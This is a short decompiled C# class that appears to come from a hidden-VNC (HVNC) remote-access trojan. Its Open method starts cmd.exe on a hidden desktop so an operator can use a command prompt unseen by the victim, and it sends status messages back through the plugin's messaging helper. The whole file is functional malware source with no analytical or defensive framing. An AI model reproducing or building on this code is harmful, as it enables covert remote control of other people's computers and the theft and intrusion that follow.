using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using HVNC;

namespace S.OpenApp
{
	// Token: 0x0200000B RID: 11
	internal class CommandPrompt
	{
		// Token: 0x06000052 RID: 82 RVA: 0x000039E0 File Offset: 0x00001BE0
		public static void Open()
		{
			try
			{
				bool flag = !File.Exists(CommandPrompt.fileNameCmd);
				bool flag2 = flag;
				if (flag2)
				{
					Plugin.Helper.SendMSG("Cmd: Not Found!");
				}
				else
				{
					HideDesktop.CreateProcess(CommandPrompt.fileNameCmd, Plugin.Helper.NameDesktop, false);
					Debug.WriteLine("Running.////");
					Plugin.Helper.SendMSG("Cmd: Running");
					Thread.Sleep(2000);
					HideDesktop.Load(Plugin.Helper.HVNCDesktop);
					Debug.WriteLine("Refresh");
				}
			}
			catch (Exception ex)
			{
				Plugin.Helper.SendMSG("Cmd: " + ex.Message);
			}
		}

		// Token: 0x04000024 RID: 36
		private static readonly string fileNameCmd = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\cmd.exe";
	}
}
